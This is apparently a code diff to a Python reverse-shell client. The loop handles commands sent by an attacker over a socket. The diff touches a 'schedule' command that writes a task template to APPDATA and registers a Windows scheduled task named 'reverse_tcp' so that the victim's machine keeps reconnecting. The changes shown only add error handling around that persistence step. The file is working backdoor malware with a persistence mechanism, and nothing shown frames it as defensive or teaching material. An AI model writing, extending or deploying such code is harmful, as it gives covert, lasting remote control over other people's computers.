@@ -110,21 +110,24 @@ while True:
             os.chdir(command[3:])
             s.send(" ")
         except:
-            s.send("cd: " + command[3:] + ": No such file or directory") 
+            s.send("cd: " + command[3:] + ": No such file or directory")
         continue;
     if len(command) > 9 and command[0: 9] == "schedule ": # schedule the task when victim connect to attacker
         if (platform.system() == "Windows"):
             ## get task interval
             minutes = int(command[9:])
 
-            ## create template
-            xml = open(os.getenv("APPDATA") + "\\schtasks_template.xml", "w");
-            xml.write(generateScheduleTask(minutes))  ## interval 30 minutes
-            xml.close()
+            try:
+                ## create template
+                xml = open(os.getenv("APPDATA") + "\\schtasks_template.xml", "w");
+                xml.write(generateScheduleTask(minutes))  ## interval 30 minutes
+                xml.close()
 
-            ## create task
-            os.system("schtasks /CREATE /XML " + os.getenv("APPDATA") + "\\schtasks_template.xml /TN reverse_tcp")
-            s.send("The scheduled task has successfully been created")
+                ## create task
+                os.system("schtasks /CREATE /XML " + os.getenv("APPDATA") + "\\schtasks_template.xml /TN reverse_tcp")
+                s.send("The scheduled task has successfully been created")
+            except:
+                s.send("Error, failed to schedule task")
             continue
         else: # wrong os
             s.send("Only for Windows system can use [schedule] command.")
